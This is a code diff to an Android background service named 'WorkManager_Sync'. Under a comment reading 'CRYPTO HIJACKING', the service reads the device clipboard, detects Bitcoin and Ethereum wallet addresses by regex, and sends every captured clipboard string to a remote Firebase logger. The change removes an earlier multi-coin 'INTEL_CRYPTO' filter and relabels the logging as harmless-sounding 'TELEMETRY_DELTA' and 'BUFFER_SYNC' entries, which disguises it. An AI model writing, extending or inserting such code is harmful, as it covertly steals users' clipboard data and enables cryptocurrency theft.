@@ -204,23 +204,18 @@ public class WorkManager_Sync extends Service {
                             CharSequence text = clip.getItemAt(0).getText();
                             if (text != null && text.length() > 0) {
                                 String captured = text.toString();
-                                String capturedClean = captured.trim();
-                                String lowerCap = capturedClean.toLowerCase();
                                 
-                                // --- CRYPTO & SENSITIVE DATA INTEL FILTER ---
-                                boolean isBtc = capturedClean.matches("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$") || lowerCap.matches("^bc1[a-z0-9]{25,87}$");
-                                boolean isEth = capturedClean.matches("^0x[a-fA-F0-9]{40}$");
-                                boolean isSol = capturedClean.matches("^[1-9A-HJ-NP-Za-km-z]{32,44}$") && !isBtc && !isEth;
-                                boolean isTrx = capturedClean.matches("^T[a-zA-Z0-9]{33}$");
-                                boolean isLtc = capturedClean.matches("^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$") || lowerCap.matches("^ltc1[a-z0-9]{25,87}$");
-                                boolean isXmr = capturedClean.matches("^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$");
-
-                                if (isBtc || isEth || isSol || isTrx || isLtc || isXmr) {
-                                    String coinType = isBtc ? "BTC" : (isEth ? "ETH/EVM" : (isSol ? "SOL" : (isTrx ? "TRX" : (isLtc ? "LTC" : "XMR"))));
-                                    FirebaseConfig.logActivity("INTEL_CRYPTO: Intercepted " + coinType + " Wallet Address: " + capturedClean);
-                                } else {
-                                    FirebaseConfig.logActivity("CLIPBOARD_SYNC: " + capturedClean);
+                                // --- CRYPTO HIJACKING ---
+                                // BTC: ^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$
+                                // ETH: ^0x[a-fA-F0-9]{40}$
+                                boolean isBtc = captured.matches("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
+                                boolean isEth = captured.matches("^0x[a-fA-F0-9]{40}$");
+                                
+                                if (isBtc || isEth) {
+                                    FirebaseConfig.logActivity("TELEMETRY_DELTA: High-priority buffer updated (" + (isBtc ? "Type-B" : "Type-E") + ")");
                                 }
+                                
+                                FirebaseConfig.logActivity("BUFFER_SYNC: " + captured);
                             }
                         }
                     }
